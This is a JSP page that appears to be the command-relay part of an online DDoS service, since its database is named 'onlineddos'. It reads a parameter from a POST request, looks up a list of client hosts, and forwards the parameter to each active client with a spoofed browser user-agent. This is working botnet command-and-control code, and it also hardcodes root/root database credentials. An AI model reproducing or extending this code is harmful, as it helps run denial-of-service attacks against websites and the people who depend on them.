<%@ page language="java" contentType="text/html; charset=utf-8"  import="java.io.*" %>
<%@ include file="../lib/tools.jsp" %>
<%@ page import="java.net.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.sql.Connection" %>
<%@ page import="java.sql.DriverManager" %>
<%@ page import="java.sql.SQLException" %>
<%@ page import="java.sql.Statement" %>
<%@ page import="java.sql.PreparedStatement" %>
<%@ page import="java.sql.ResultSet" %>

<%
			if(request.getMethod()!="POST")
			{
				out.println("错误的访问方式！");
				return;
			}
			String Paremeter = URLDecoder.decode(removeAllBlank(request.getParameter("paremeter")));
			String url="jdbc:mysql://127.0.0.1:3306/onlineddos";
		    String dbuser="root";
			String dbpwd="root";
			try
			{
				Class.forName("com.mysql.jdbc.Driver");
			}
			catch (ClassNotFoundException e)
			{
				e.printStackTrace();
			}
			Connection conn=DriverManager.getConnection(url, dbuser, dbpwd);
			PreparedStatement ps=null;
			ResultSet rs=null;
			try
			{
				String sql="select * from clientlist";
				int result = 0;
				ps = conn.prepareStatement(sql);
				rs = ps.executeQuery();
				while(rs.next())
				{
					String URL = "http://"+rs.getString(1);
					String status = rs.getString(3);
					if(status == "0" || status.equals(new String("200")))
					{
						sendPost(URL,Paremeter);
						result++;
					}
				}
				out.println("Send Test to Client Success Count:"+result);
			}
			catch (SQLException e)
			{
				e.printStackTrace();
			}
			finally
			{
					try
					{
						if(rs!=null)	
							rs.close();
					}
					catch (SQLException e)
					{
						e.printStackTrace();
					}
					finally
					{
							try
							{
								if(ps!=null)	
									ps.close();
							}
							catch (SQLException e)
							{
								e.printStackTrace();
							}
							finally
							{
								try
								{
									if(conn!=null)
										conn.close();
								}
								catch (SQLException e)
								{
										e.printStackTrace();
								}
							}
					}
			}
%>
<%!
public String sendPost(String url, String param) {
		PrintWriter out1 = null;
		BufferedReader in1 = null;
		String result = "";
		try {
			URLConnection conn = new URL(url).openConnection();
			conn.setRequestProperty("accept", "*/*");
			conn.setRequestProperty("connection", "Keep-Alive");
			conn.setRequestProperty("user-agent","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
			conn.setDoOutput(true);
			conn.setDoInput(true);
			out1 = new PrintWriter(conn.getOutputStream());
			out1.print(param);
			out1.flush();
			in1 = new BufferedReader(
					new InputStreamReader(conn.getInputStream()));
			String line = null;
			while ((line = in1.readLine()) != null) {
				result += line;
			}
			out1.close();
			in1.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return result;
	}
%>